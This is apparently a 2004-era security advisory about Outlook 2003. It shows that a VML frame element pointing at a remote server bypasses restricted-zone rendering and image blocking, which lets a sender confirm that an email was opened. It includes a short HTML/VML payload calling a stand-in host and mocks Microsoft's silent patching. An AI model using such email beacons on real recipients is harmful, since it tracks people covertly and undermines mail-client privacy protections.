Outlook 2003 the premier mail client from the company
called 'Microsoft' certainly appears to have a lot of security
features built into it.  Cursory examination shows excellent
thought into 'spam' containment, 'security' consideration and
many other little 'things'. So much so the default rendering of
html is in so-called 'restricted zone' which disallows nearly
everything [frames, iframes, objects, scripting etc.]. In
addition 'special' spam measures are taken to disallow graphic
downloads from a remote server in html email which can be used
to verify recipients:

The Key Word is: nearly

Utilising Outlook's own bizarre scheMAH ! which comprises
a 'proper' frame along with an src pointing to our remote
server, we are able to ping the server and confirm our recipient
has viewed our email. We don't require graphics or frames or
iframes to do that:

<v:vml frame style="LEFT: 50px; WIDTH: 300px; POSITION:
relative; TOP: 30px; HEIGHT: 200px"
src = "<http://www.malware.com/duh.txt#malware>"></v:vmlframe>

<HTML>
<HEAD>
<STYLE>
v\:* { behavior: url(#default#VML); }
</STYLE>
<XML:NAMESPACE NS="urn:schemas-microsoft-com:vml" PREFIX="v"/>
</HEAD>

Notes:

1. We now commence our examination of the Microsoft Office 2003
suite, we're a bit late, but it has taken all this time to save
up to buy the thing
2. Quick 72 hour prodding reveals that this 'perceived' premier
device known as Outlook 2003 is in fact riddled with holes
3. Do not receive or open any emails period.  Use string and tin
cans if you must communicate

End Call

I think Mark might be onto something both the vml and the copies
of named files in the temp folder no longer appear to occur:

<http://www.securityfocus.com/bid/10323>
<http://www.securityfocus.com/bid/10307>

Those notes are dated 10th and 11th May. On the machine they no
longer work on, we have a couple XP so-called 'patches' from
14th May and 17th May with a 3 or 4 office update folders with
files created on 17th May as well.

How's that for service. Quick, silent patching ! No need to
bother anyone ! Well done lads.

[unless of course if our little XP test machines are broken and
we are seeing things]

How's that for service. Quick, silent patching ! No need to
bother anyone ! Well done lads. You see you can do it. When the
resultant bug affects your bread and butter as it were, multiple
billions of dollars can be thrown at the problem and a fix
provided under a week. Silently too ! This despite the PR flack
machine claiming all sorts of nonsense excuses about testing on
all sorts of machines.

Bravo to Microsoft ! When they have to they can ! 5 gold stars !
